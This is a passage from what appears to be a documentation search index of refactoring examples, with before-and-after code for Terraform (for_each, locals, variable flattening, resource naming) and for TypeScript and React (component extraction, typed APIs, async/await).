Testable: Module can be tested independently</li> </ul>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#use-for_each-instead-of-count","title":"Use for_each Instead of count","text":"","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#problem-using-count-for-dynamic-resources-causes-recreation-on-reordering","title":"Problem: Using count for dynamic resources causes recreation on reordering","text":"<p>Before (using count):</p> <pre><code>variable \"users\" {\n  description = \"List of IAM users to create\"\n  type        = list(string)\n  default     = [\"alice\", \"bob\", \"charlie\"]\n}\n\nresource \"aws_iam_user\" \"users\" {\n  count = length(var.users)\n  name  = var.users[count.index]\n\n  tags = {\n    Environment = \"production\"\n  }\n}\n\nresource \"aws_iam_access_key\" \"users\" {\n  count = length(var.users)\n  user  = aws_iam_user.users[count.index].name\n}\n\n## Problem: If you remove \"bob\" from the list:\n## variable \"users\" {\n##   default = [\"alice\", \"charlie\"]  # bob removed\n## }\n## Terraform will:\n## 1. Destroy users[1] (bob) - GOOD\n## 2. Destroy users[2] (charlie) - BAD!\n## 3. Recreate users[1] (charlie) - BAD!\n## Charlie's access keys get destroyed and recreated!\n</code></pre> <p>After (using for_each):</p> <pre><code>variable \"users\" {\n  description = \"Set of IAM users to create\"\n  type        = set(string)\n  default     = [\"alice\", \"bob\", \"charlie\"]\n}\n\nresource \"aws_iam_user\" \"users\" {\n  for_each = var.users\n\n  name = each.key\n\n  tags = {\n    Environment = \"production\"\n  }\n}\n\nresource \"aws_iam_access_key\" \"users\" {\n  for_each = var.users\n\n  user = aws_iam_user.users[each.key].name\n}\n\n## Now if you remove \"bob\" from the set:\n## variable \"users\" {\n##   default = [\"alice\", \"charlie\"]  # bob removed\n## }\n## Terraform will:\n## 1. Destroy users[\"bob\"] - GOOD\n## Charlie is untouched because he's keyed by name, not index!\n</code></pre> <p>Even Better (using map for additional attributes):</p> <pre><code>variable \"users\" {\n  description = \"Map of IAM users with their attributes\"\n  type = map(object({\n    path   = string\n    groups = list(string)\n  }))\n  default = {\n    alice = {\n      path   = \"/developers/\"\n      groups = [\"developers\", \"admins\"]\n    }\n    bob = {\n      path   = \"/contractors/\"\n      groups = [\"developers\"]\n    }\n    charlie = {\n      path   = \"/developers/\"\n      groups = [\"developers\"]\n    }\n  }\n}\n\nresource \"aws_iam_user\" \"users\" {\n  for_each = var.users\n\n  name = each.key\n  path = each.value.path\n\n  tags = {\n    Environment = \"production\"\n    UserType    = split(\"/\", each.value.path)[1]\n  }\n}\n\nresource \"aws_iam_user_group_membership\" \"users\" {\n  for_each = var.users\n\n  user   = aws_iam_user.users[each.key].name\n  groups = each.value.groups\n}\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Stable resource addresses (keyed by name, not index)</li> <li>\u2705 No unnecessary resource recreation</li> <li>\u2705 Safer operations when adding/removing items</li> <li>\u2705 More readable state (users[\"alice\"] vs users[0])</li> <li>\u2705 Can associate additional attributes per item</li> </ul>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#apply-locals-for-dry","title":"Apply Locals for DRY","text":"","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#problem-repeated-expressions-and-hard-coded-values","title":"Problem: Repeated expressions and hard-coded values","text":"<p>Before:</p> <pre><code>resource \"aws_instance\" \"web\" {\n  count         = 3\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t3.medium\"\n\n  tags = {\n    Name        = \"web-server-${count.index + 1}\"\n    Environment = \"production\"\n    Project     = \"my-project\"\n    CostCenter  = \"engineering\"\n    ManagedBy   = \"Terraform\"\n    Owner       = \"platform-team@example.com\"\n  }\n}\n\nresource \"aws_instance\" \"api\" {\n  count         = 2\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t3.large\"\n\n  tags = {\n    Name        = \"api-server-${count.index + 1}\"\n    Environment = \"production\"\n    Project     = \"my-project\"\n    CostCenter  = \"engineering\"\n    ManagedBy   = \"Terraform\"\n    Owner       = \"platform-team@example.com\"\n  }\n}\n\nresource \"aws_db_instance\" \"main\" {\n  identifier        = \"production-my-project-db\"\n  engine            = \"postgres\"\n  instance_class    = \"db.t3.medium\"\n  allocated_storage = 100\n\n  tags = {\n    Name        = \"main-database\"\n    Environment = \"production\"\n    Project     = \"my-project\"\n    CostCenter  = \"engineering\"\n    ManagedBy   = \"Terraform\"\n    Owner       = \"platform-team@example.com\"\n  }\n}\n</code></pre> <p>After:</p> <pre><code>locals {\n  # Environment configuration\n  environment = \"production\"\n  project     = \"my-project\"\n\n  # Common naming prefix\n  name_prefix = \"${local.environment}-${local.project}\"\n\n  # AMI selection based on environment\n  amis = {\n    production = \"ami-0c55b159cbfafe1f0\"\n    staging    = \"ami-0abcdef123456789\"\n    dev        = \"ami-0fedcba987654321\"\n  }\n\n  selected_ami = local.amis[local.environment]\n\n  # Common tags applied to all resources\n  common_tags = {\n    Environment = local.environment\n    Project     = local.project\n    CostCenter  = \"engineering\"\n    ManagedBy   = \"Terraform\"\n    Owner       = \"platform-team@example.com\"\n  }\n\n  # Instance type selection based on environment\n  instance_types = {\n    production = {\n      web = \"t3.medium\"\n      api = \"t3.large\"\n    }\n    staging = {\n      web = \"t3.small\"\n      api = \"t3.medium\"\n    }\n    dev = {\n      web = \"t3.micro\"\n      api = \"t3.small\"\n    }\n  }\n}\n\nresource \"aws_instance\" \"web\" {\n  count = 3\n\n  ami           = local.selected_ami\n  instance_type = local.instance_types[local.environment].web\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${local.name_prefix}-web-${count.index + 1}\"\n      Role = \"web-server\"\n    }\n  )\n}\n\nresource \"aws_instance\" \"api\" {\n  count = 2\n\n  ami           = local.selected_ami\n  instance_type = local.instance_types[local.environment].api\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${local.name_prefix}-api-${count.index + 1}\"\n      Role = \"api-server\"\n    }\n  )\n}\n\nresource \"aws_db_instance\" \"main\" {\n  identifier        = \"${local.name_prefix}-db\"\n  engine            = \"postgres\"\n  instance_class    = \"db.${local.instance_types[local.environment].api}\"\n  allocated_storage = 100\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"main-database\"\n      Role = \"database\"\n    }\n  )\n}\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Single source of truth for repeated values</li> <li>\u2705 Consistent naming across resources</li> <li>\u2705 Easy to change environment-specific values</li> <li>\u2705 Centralized tag management</li> <li>\u2705 Reduced risk of typos and inconsistencies</li> </ul>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#simplify-variable-structures","title":"Simplify Variable Structures","text":"","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#problem-complex-nested-variable-structures-that-are-hard-to-use","title":"Problem: Complex, nested variable structures that are hard to use","text":"<p>Before:</p> <pre><code>variable \"config\" {\n  description = \"Application configuration\"\n  type = object({\n    app = object({\n      name    = string\n      version = string\n      env = object({\n        vars = list(object({\n          key   = string\n          value = string\n        }))\n      })\n    })\n    infra = object({\n      vpc = object({\n        cidr = string\n        azs  = list(string)\n      })\n      compute = object({\n        instance_type = string\n        count         = number\n      })\n    })\n  })\n}\n\n## Usage (very verbose and error-prone)\nresource \"aws_instance\" \"app\" {\n  count         = var.config.infra.compute.count\n  instance_type = var.config.infra.compute.instance_type\n\n  # Hard to work with nested env vars\n  user_data = templatefile(\"${path.module}/user-data.sh\", {\n    app_name = var.config.app.name\n    env_vars = {\n      for env in var.config.app.env.vars :\n      env.key =&gt; env.value\n    }\n  })\n\n  tags = {\n    Name    = \"${var.config.app.name}-${count.index}\"\n    Version = var.config.app.version\n  }\n}\n</code></pre> <p>After:</p> <pre><code>## Flatten and simplify variable structure\nvariable \"app_name\" {\n  description = \"Application name\"\n  type        = string\n}\n\nvariable \"app_version\" {\n  description = \"Application version\"\n  type        = string\n}\n\nvariable \"environment_variables\" {\n  description = \"Application environment variables\"\n  type        = map(string)\n  default     = {}\n}\n\nvariable \"vpc_cidr\" {\n  description = \"VPC CIDR block\"\n  type        = string\n}\n\nvariable \"availability_zones\" {\n  description = \"List of availability zones\"\n  type        = list(string)\n}\n\nvariable \"instance_type\" {\n  description = \"EC2 instance type\"\n  type        = string\n  default     = \"t3.medium\"\n}\n\nvariable \"instance_count\" {\n  description = \"Number of instances to create\"\n  type        = number\n  default     = 1\n\n  validation {\n    condition     = var.instance_count &gt; 0 &amp;&amp; var.instance_count &lt;= 10\n    error_message = \"Instance count must be between 1 and 10.\"\n  }\n}\n\n## Usage (much simpler and clearer)\nresource \"aws_instance\" \"app\" {\n  count         = var.instance_count\n  instance_type = var.instance_type\n\n  user_data = templatefile(\"${path.module}/user-data.sh\", {\n    app_name = var.app_name\n    env_vars = var.environment_variables\n  })\n\n  tags = {\n    Name    = \"${var.app_name}-${count.index}\"\n    Version = var.app_version\n  }\n}\n\n## terraform.tfvars (easier to read and write)\napp_name    = \"my-application\"\napp_version = \"1.2.3\"\n\nenvironment_variables = {\n  LOG_LEVEL    = \"info\"\n  DATABASE_URL = \"postgres://...\"\n  API_KEY      = \"secret-key\"\n}\n\nvpc_cidr           = \"10.0.0.0/16\"\navailability_zones = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\n\ninstance_type  = \"t3.large\"\ninstance_count = 3\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Flattened structure is easier to understand</li> <li>\u2705 Each variable has a clear, single purpose</li> <li>\u2705 Better IDE autocomplete support</li> <li>\u2705 Easier to document with clear descriptions</li> <li>\u2705 Validation rules can be applied per variable</li> <li>\u2705 Simpler to override specific values</li> </ul>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#improve-resource-naming","title":"Improve Resource Naming","text":"","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#problem-inconsistent-and-unclear-resource-naming","title":"Problem: Inconsistent and unclear resource naming","text":"<p>Before:</p> <pre><code>resource \"aws_vpc\" \"main\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n\nresource \"aws_vpc\" \"vpc2\" {\n  cidr_block = \"172.16.0.0/16\"\n}\n\nresource \"aws_subnet\" \"subnet1\" {\n  vpc_id     = aws_vpc.main.id\n  cidr_block = \"10.0.1.0/24\"\n}\n\nresource \"aws_subnet\" \"pub_sub\" {\n  vpc_id     = aws_vpc.main.id\n  cidr_block = \"10.0.10.0/24\"\n}\n\nresource \"aws_instance\" \"server\" {\n  ami           = \"ami-12345\"\n  instance_type = \"t3.medium\"\n  subnet_id     = aws_subnet.subnet1.id\n}\n\nresource \"aws_instance\" \"web_server\" {\n  ami           = \"ami-12345\"\n  instance_type = \"t3.medium\"\n  subnet_id     = aws_subnet.pub_sub.id\n}\n\nresource \"aws_security_group\" \"sg\" {\n  vpc_id = aws_vpc.main.id\n}\n\n## References are unclear:\n## - What is \"main\" vs \"vpc2\"?\n## - What's the difference between \"subnet1\" and \"pub_sub\"?\n## - What does \"server\" do vs \"web_server\"?\n</code></pre> <p>After:</p> <pre><code>## Use descriptive, consistent naming patterns\n\n## VPCs: describe purpose\nresource \"aws_vpc\" \"application\" {\n  cidr_block = \"10.0.0.0/16\"\n\n  tags = {\n    Name = \"application-vpc\"\n  }\n}\n\nresource \"aws_vpc\" \"management\" {\n  cidr_block = \"172.16.0.0/16\"\n\n  tags = {\n    Name = \"management-vpc\"\n  }\n}\n\n## Subnets: include type and purpose\nresource \"aws_subnet\" \"application_private\" {\n  for_each = toset([\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"])\n\n  vpc_id = aws_vpc.application.id\n  cidr_block = cidrsubnet(\n    aws_vpc.application.cidr_block,\n    8,\n    index([\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"], each.key)\n  )\n  availability_zone = each.key\n\n  tags = {\n    Name = \"application-private-${each.key}\"\n    Type = \"private\"\n  }\n}\n\nresource \"aws_subnet\" \"application_public\" {\n  for_each = toset([\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"])\n\n  vpc_id = aws_vpc.application.id\n  cidr_block = cidrsubnet(\n    aws_vpc.application.cidr_block,\n    8,\n    index([\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"], each.key) + 10\n  )\n  availability_zone = each.key\n  map_public_ip_on_launch = true\n\n  tags = {\n    Name = \"application-public-${each.key}\"\n    Type = \"public\"\n  }\n}\n\n## Instances: describe role and tier\nresource \"aws_instance\" \"api_backend\" {\n  count = 2\n\n  ami           = data.aws_ami.amazon_linux_2.id\n  instance_type = \"t3.medium\"\n  subnet_id     = aws_subnet.application_private[\"us-east-1a\"].id\n\n  vpc_security_group_ids = [\n    aws_security_group.api_backend.id\n  ]\n\n  tags = {\n    Name = \"api-backend-${count.index + 1}\"\n    Role = \"backend\"\n    Tier = \"api\"\n  }\n}\n\nresource \"aws_instance\" \"web_frontend\" {\n  count = 3\n\n  ami           = data.aws_ami.amazon_linux_2.id\n  instance_type = \"t3.medium\"\n  subnet_id     = aws_subnet.application_public[\"us-east-1a\"].id\n\n  vpc_security_group_ids = [\n    aws_security_group.web_frontend.id\n  ]\n\n  tags = {\n    Name = \"web-frontend-${count.index + 1}\"\n    Role = \"frontend\"\n    Tier = \"web\"\n  }\n}\n\n## Security groups: describe what they protect\nresource \"aws_security_group\" \"api_backend\" {\n  name_prefix = \"api-backend-\"\n  description = \"Security group for API backend instances\"\n  vpc_id      = aws_vpc.application.id\n\n  tags = {\n    Name = \"api-backend-sg\"\n  }\n}\n\nresource \"aws_security_group\" \"web_frontend\" {\n  name_prefix = \"web-frontend-\"\n  description = \"Security group for web frontend instances\"\n  vpc_id      = aws_vpc.application.id\n\n  tags = {\n    Name = \"web-frontend-sg\"\n  }\n}\n\n## Now references are clear:\n## - aws_vpc.application vs aws_vpc.management (purpose-based)\n## - aws_subnet.application_private vs application_public (type-based)\n## - aws_instance.api_backend vs web_frontend (role-based)\n## - aws_security_group.api_backend (matches protected resource)\n</code></pre> <p>Naming Conventions Applied:</p> <ol> <li>VPCs: Use purpose (application, management, data)</li> <li>Subnets: Include type and purpose (application_private, application_public)</li> <li>Instances: Describe tier and role (api_backend, web_frontend, database_primary)</li> <li>Security Groups: Match the resource they protect</li> <li>Load Balancers: Include tier (application_alb, internal_nlb)</li> <li>Use this as resource name: Prefer when there's only one of a resource type</li> </ol> <p>Improvements:</p> <ul> <li>\u2705 Self-documenting infrastructure</li> <li>\u2705 Easy to understand resource relationships</li> <li>\u2705 Consistent naming patterns across the codebase</li> <li>\u2705 Clear intent of each resource</li> <li>\u2705 Easier to search and find resources</li> <li>\u2705 Better for team collaboration</li> </ul>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#resources","title":"Resources","text":"","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#tools","title":"Tools","text":"<ul> <li>terraform fmt: Format Terraform files</li> <li>tflint: Terraform linter</li> <li>terraform-docs: Generate documentation</li> <li>terrascan: Security scanning</li> <li>checkov: Policy as code scanning</li> </ul>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/terraform_refactoring/#related-documentation","title":"Related Documentation","text":"<ul> <li>Terraform Style Guide</li> <li>Terraform Module Template</li> <li>Testing Strategies</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-12-06</p>","tags":["terraform","refactoring","best-practices","examples","iac"]},{"location":"09_refactoring/typescript_refactoring/","title":"TypeScript Refactoring Examples","text":"<p>Real-world examples of refactoring TypeScript code to improve type safety, maintainability, and modern best practices.</p>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#extract-components-from-monolithic-files","title":"Extract Components from Monolithic Files","text":"","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#problem-large-component-file-with-mixed-concerns","title":"Problem: Large component file with mixed concerns","text":"<p>Before (UserDashboard.tsx - 400 lines):</p> <pre><code>import React, { useState, useEffect } from 'react';\nimport axios from 'axios';\n\nexport function UserDashboard({ userId }: { userId: string }) {\n  const [user, setUser] = useState&lt;any&gt;(null);\n  const [orders, setOrders] = useState&lt;any[]&gt;([]);\n  const [loading, setLoading] = useState(true);\n  const [selectedOrder, setSelectedOrder] = useState&lt;any&gt;(null);\n\n  useEffect(() =&gt; {\n    fetchData();\n  }, [userId]);\n\n  async function fetchData() {\n    try {\n      const userRes = await axios.get(`/api/users/${userId}`);\n      const ordersRes = await axios.get(`/api/users/${userId}/orders`);\n      setUser(userRes.data);\n      setOrders(ordersRes.data);\n    } catch (error) {\n      console.error(error);\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  if (loading) {\n    return &lt;div&gt;Loading...&lt;/div&gt;;\n  }\n\n  return (\n    &lt;div className=\"dashboard\"&gt;\n      &lt;div className=\"user-info\"&gt;\n        &lt;h1&gt;{user.name}&lt;/h1&gt;\n        &lt;p&gt;{user.email}&lt;/p&gt;\n        &lt;span className={user.premium ? 'badge-premium' : 'badge-standard'}&gt;\n          {user.premium ? 'Premium' : 'Standard'}\n        &lt;/span&gt;\n      &lt;/div&gt;\n\n      &lt;div className=\"orders-section\"&gt;\n        &lt;h2&gt;Orders&lt;/h2&gt;\n        &lt;div className=\"orders-list\"&gt;\n          {orders.map(order =&gt; (\n            &lt;div key={order.id} className=\"order-card\" onClick={() =&gt; setSelectedOrder(order)}&gt;\n              &lt;h3&gt;Order #{order.id}&lt;/h3&gt;\n              &lt;p&gt;Date: {new Date(order.createdAt).toLocaleDateString()}&lt;/p&gt;\n              &lt;p&gt;Total: ${order.total.toFixed(2)}&lt;/p&gt;\n              &lt;span className={`status-${order.status}`}&gt;{order.status}&lt;/span&gt;\n            &lt;/div&gt;\n          ))}\n        &lt;/div&gt;\n      &lt;/div&gt;\n\n      {selectedOrder &amp;&amp; (\n        &lt;div className=\"order-details-modal\"&gt;\n          &lt;h2&gt;Order Details&lt;/h2&gt;\n          &lt;button onClick={() =&gt; setSelectedOrder(null)}&gt;Close&lt;/button&gt;\n          &lt;div&gt;\n            &lt;h3&gt;Order #{selectedOrder.id}&lt;/h3&gt;\n            &lt;p&gt;Status: {selectedOrder.status}&lt;/p&gt;\n            &lt;h4&gt;Items:&lt;/h4&gt;\n            &lt;ul&gt;\n              {selectedOrder.items.map((item: any, idx: number) =&gt; (\n                &lt;li key={idx}&gt;\n                  {item.name} - Qty: {item.quantity} - ${item.price}\n                &lt;/li&gt;\n              ))}\n            &lt;/ul&gt;\n            &lt;p&gt;&lt;strong&gt;Total: ${selectedOrder.total.toFixed(2)}&lt;/strong&gt;&lt;/p&gt;\n          &lt;/div&gt;\n        &lt;/div&gt;\n      )}\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>After (Properly separated):</p> <pre><code>// types/user.types.ts\nexport interface User {\n  id: string;\n  name: string;\n  email: string;\n  premium: boolean;\n}\n\nexport interface OrderItem {\n  id: string;\n  name: string;\n  quantity: number;\n  price: number;\n}\n\nexport interface Order {\n  id: string;\n  createdAt: string;\n  total: number;\n  status: 'pending' | 'shipped' | 'delivered' | 'cancelled';\n  items: OrderItem[];\n}\n\n// hooks/useUserData.ts\nimport { useState, useEffect } from 'react';\nimport type { User, Order } from '../types/user.types';\nimport { fetchUser, fetchUserOrders } from '../api/users';\n\ninterface UseUserDataResult {\n  user: User | null;\n  orders: Order[];\n  loading: boolean;\n  error: Error | null;\n}\n\nexport function useUserData(userId: string): UseUserDataResult {\n  const [user, setUser] = useState&lt;User | null&gt;(null);\n  const [orders, setOrders] = useState&lt;Order[]&gt;([]);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState&lt;Error | null&gt;(null);\n\n  useEffect(() =&gt; {\n    async function loadData() {\n      try {\n        setLoading(true);\n        const [userData, ordersData] = await Promise.all([\n          fetchUser(userId),\n          fetchUserOrders(userId)\n        ]);\n        setUser(userData);\n        setOrders(ordersData);\n      } catch (err) {\n        setError(err instanceof Error ? err : new Error('Failed to load data'));\n      } finally {\n        setLoading(false);\n      }\n    }\n\n    loadData();\n  }, [userId]);\n\n  return { user, orders, loading, error };\n}\n\n// components/UserInfo.tsx\nimport React from 'react';\nimport type { User } from '../types/user.types';\n\ninterface UserInfoProps {\n  user: User;\n}\n\nexport function UserInfo({ user }: UserInfoProps): JSX.Element {\n  return (\n    &lt;div className=\"user-info\"&gt;\n      &lt;h1&gt;{user.name}&lt;/h1&gt;\n      &lt;p&gt;{user.email}&lt;/p&gt;\n      &lt;span className={user.premium ? 'badge-premium' : 'badge-standard'}&gt;\n        {user.premium ? 'Premium' : 'Standard'}\n      &lt;/span&gt;\n    &lt;/div&gt;\n  );\n}\n\n// components/OrderCard.tsx\nimport React from 'react';\nimport type { Order } from '../types/user.types';\n\ninterface OrderCardProps {\n  order: Order;\n  onClick: (order: Order) =&gt; void;\n}\n\nexport function OrderCard({ order, onClick }: OrderCardProps): JSX.Element {\n  return (\n    &lt;div className=\"order-card\" onClick={() =&gt; onClick(order)}&gt;\n      &lt;h3&gt;Order #{order.id}&lt;/h3&gt;\n      &lt;p&gt;Date: {new Date(order.createdAt).toLocaleDateString()}&lt;/p&gt;\n      &lt;p&gt;Total: ${order.total.toFixed(2)}&lt;/p&gt;\n      &lt;span className={`status-${order.status}`}&gt;{order.status}&lt;/span&gt;\n    &lt;/div&gt;\n  );\n}\n\n// components/OrdersList.tsx\nimport React from 'react';\nimport type { Order } from '../types/user.types';\nimport { OrderCard } from './OrderCard';\n\ninterface OrdersListProps {\n  orders: Order[];\n  onOrderSelect: (order: Order) =&gt; void;\n}\n\nexport function OrdersList({ orders, onOrderSelect }: OrdersListProps): JSX.Element {\n  return (\n    &lt;div className=\"orders-section\"&gt;\n      &lt;h2&gt;Orders&lt;/h2&gt;\n      &lt;div className=\"orders-list\"&gt;\n        {orders.map(order =&gt; (\n          &lt;OrderCard key={order.id} order={order} onClick={onOrderSelect} /&gt;\n        ))}\n      &lt;/div&gt;\n    &lt;/div&gt;\n  );\n}\n\n// components/OrderDetailsModal.tsx\nimport React from 'react';\nimport type { Order } from '../types/user.types';\n\ninterface OrderDetailsModalProps {\n  order: Order;\n  onClose: () =&gt; void;\n}\n\nexport function OrderDetailsModal({ order, onClose }: OrderDetailsModalProps): JSX.Element {\n  return (\n    &lt;div className=\"order-details-modal\"&gt;\n      &lt;h2&gt;Order Details&lt;/h2&gt;\n      &lt;button onClick={onClose}&gt;Close&lt;/button&gt;\n      &lt;div&gt;\n        &lt;h3&gt;Order #{order.id}&lt;/h3&gt;\n        &lt;p&gt;Status: {order.status}&lt;/p&gt;\n        &lt;h4&gt;Items:&lt;/h4&gt;\n        &lt;ul&gt;\n          {order.items.map((item) =&gt; (\n            &lt;li key={item.id}&gt;\n              {item.name} - Qty: {item.quantity} - ${item.price.toFixed(2)}\n            &lt;/li&gt;\n          ))}\n        &lt;/ul&gt;\n        &lt;p&gt;&lt;strong&gt;Total: ${order.total.toFixed(2)}&lt;/strong&gt;&lt;/p&gt;\n      &lt;/div&gt;\n    &lt;/div&gt;\n  );\n}\n\n// components/UserDashboard.tsx\nimport React, { useState } from 'react';\nimport type { Order } from '../types/user.types';\nimport { useUserData } from '../hooks/useUserData';\nimport { UserInfo } from './UserInfo';\nimport { OrdersList } from './OrdersList';\nimport { OrderDetailsModal } from './OrderDetailsModal';\nimport { LoadingSpinner } from './LoadingSpinner';\nimport { ErrorMessage } from './ErrorMessage';\n\ninterface UserDashboardProps {\n  userId: string;\n}\n\nexport function UserDashboard({ userId }: UserDashboardProps): JSX.Element {\n  const { user, orders, loading, error } = useUserData(userId);\n  const [selectedOrder, setSelectedOrder] = useState&lt;Order | null&gt;(null);\n\n  if (loading) {\n    return &lt;LoadingSpinner /&gt;;\n  }\n\n  if (error || !user) {\n    return &lt;ErrorMessage error={error || new Error('User not found')} /&gt;;\n  }\n\n  return (\n    &lt;div className=\"dashboard\"&gt;\n      &lt;UserInfo user={user} /&gt;\n      &lt;OrdersList orders={orders} onOrderSelect={setSelectedOrder} /&gt;\n      {selectedOrder &amp;&amp; (\n        &lt;OrderDetailsModal\n          order={selectedOrder}\n          onClose={() =&gt; setSelectedOrder(null)}\n        /&gt;\n      )}\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Separated into focused, single-responsibility components</li> <li>\u2705 Proper TypeScript interfaces (no <code>any</code> types)</li> <li>\u2705 Custom hook for data fetching logic</li> <li>\u2705 Reusable components</li> <li>\u2705 Better error handling</li> <li>\u2705 Easier to test each component</li> </ul>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#replace-any-with-proper-types","title":"Replace <code>any</code> with Proper Types","text":"","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#problem-unsafe-any-types-throughout-codebase","title":"Problem: Unsafe <code>any</code> types throughout codebase","text":"<p>Before:</p> <pre><code>interface ApiResponse {\n  data: any;\n  status: number;\n}\n\nasync function fetchData(url: string): Promise&lt;any&gt; {\n  const response = await fetch(url);\n  return response.json();\n}\n\nfunction processUser(user: any) {\n  return {\n    name: user.name.toUpperCase(),\n    email: user.email.toLowerCase(),\n    age: new Date().getFullYear() - new Date(user.birthdate).getFullYear()\n  };\n}\n\nconst users: any[] = await fetchData('/api/users');\nconst processed = users.map(processUser);\n</code></pre> <p>After:</p> <pre><code>// Define specific response types\ninterface User {\n  id: string;\n  name: string;\n  email: string;\n  birthdate: string;\n}\n\ninterface ProcessedUser {\n  name: string;\n  email: string;\n  age: number;\n}\n\ninterface ApiResponse&lt;T&gt; {\n  data: T;\n  status: number;\n  message?: string;\n}\n\n// Type-safe fetch with generics\nasync function fetchData&lt;T&gt;(url: string): Promise&lt;ApiResponse&lt;T&gt;&gt; {\n  const response = await fetch(url);\n  if (!response.ok) {\n    throw new Error(`HTTP error! status: ${response.status}`);\n  }\n  const data = await response.json();\n  return {\n    data,\n    status: response.status\n  };\n}\n\n// Type-safe user processing\nfunction processUser(user: User): ProcessedUser {\n  const birthYear = new Date(user.birthdate).getFullYear();\n  const currentYear = new Date().getFullYear();\n\n  return {\n    name: user.name.toUpperCase(),\n    email: user.email.toLowerCase(),\n    age: currentYear - birthYear\n  };\n}\n\n// Usage with full type safety\nconst response = await fetchData&lt;User[]&gt;('/api/users');\nconst users: User[] = response.data;\nconst processed: ProcessedUser[] = users.map(processUser);\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Zero <code>any</code> types</li> <li>\u2705 Generic types for reusability</li> <li>\u2705 Compile-time type checking</li> <li>\u2705 Better IDE autocomplete</li> <li>\u2705 Prevents runtime errors</li> </ul>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#simplify-asyncawait-chains","title":"Simplify Async/Await Chains","text":"","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#problem-callback-hell-with-promises","title":"Problem: Callback hell with promises","text":"<p>Before:</p> <pre><code>function deployApplication(appId: string) {\n  return validateApp(appId)\n    .then(app =&gt; {\n      return buildApp(app)\n        .then(buildResult =&gt; {\n          return runTests(buildResult)\n            .then(testResult =&gt; {\n              if (testResult.passed) {\n                return deployToStaging(buildResult)\n                  .then(stagingResult =&gt; {\n                    return validateStaging(stagingResult)\n                      .then(validationResult =&gt; {\n                        if (validationResult.success) {\n                          return deployToProduction(buildResult);\n                        }\n                        throw new Error('Staging validation failed');\n                      });\n                  });\n              }\n              throw new Error('Tests failed');\n            });\n        });\n    })\n    .catch(error =&gt; {\n      console.error('Deployment failed:', error);\n      throw error;\n    });\n}\n</code></pre> <p>After:</p> <pre><code>interface App {\n  id: string;\n  name: string;\n  version: string;\n}\n\ninterface BuildResult {\n  app: App;\n  artifactUrl: string;\n  buildTime: number;\n}\n\ninterface TestResult {\n  passed: boolean;\n  coverage: number;\n  failedTests: string[];\n}\n\ninterface DeploymentResult {\n  environment: 'staging' | 'production';\n  url: string;\n  deployedAt: Date;\n}\n\ninterface ValidationResult {\n  success: boolean;\n  healthChecks: Record&lt;string, boolean&gt;;\n}\n\nclass DeploymentError extends Error {\n  constructor(\n    message: string,\n    public readonly stage: string,\n    public readonly details?: unknown\n  ) {\n    super(message);\n    this.name = 'DeploymentError';\n  }\n}\n\nasync function deployApplication(appId: string): Promise&lt;DeploymentResult&gt; {\n  try {\n    // Step 1: Validate application\n    const app = await validateApp(appId);\n\n    // Step 2: Build application\n    const buildResult = await buildApp(app);\n\n    // Step 3: Run tests\n    const testResult = await runTests(buildResult);\n    if (!testResult.passed) {\n      throw new DeploymentError(\n        'Tests failed',\n        'testing',\n        { failedTests: testResult.failedTests }\n      );\n    }\n\n    // Step 4: Deploy to staging\n    const stagingResult = await deployToStaging(buildResult);\n\n    // Step 5: Validate staging environment\n    const validationResult = await validateStaging(stagingResult);\n    if (!validationResult.success) {\n      throw new DeploymentError(\n        'Staging validation failed',\n        'validation',\n        { healthChecks: validationResult.healthChecks }\n      );\n    }\n\n    // Step 6: Deploy to production\n    const productionResult = await deployToProduction(buildResult);\n\n    return productionResult;\n\n  } catch (error) {\n    if (error instanceof DeploymentError) {\n      console.error(`Deployment failed at ${error.stage}:`, error.message, error.details);\n    } else {\n      console.error('Unexpected deployment error:', error);\n    }\n    throw error;\n  }\n}\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Linear, readable async/await flow</li> <li>\u2705 Proper error handling with custom error class</li> <li>\u2705 Type-safe at every step</li> <li>\u2705 Clear separation of 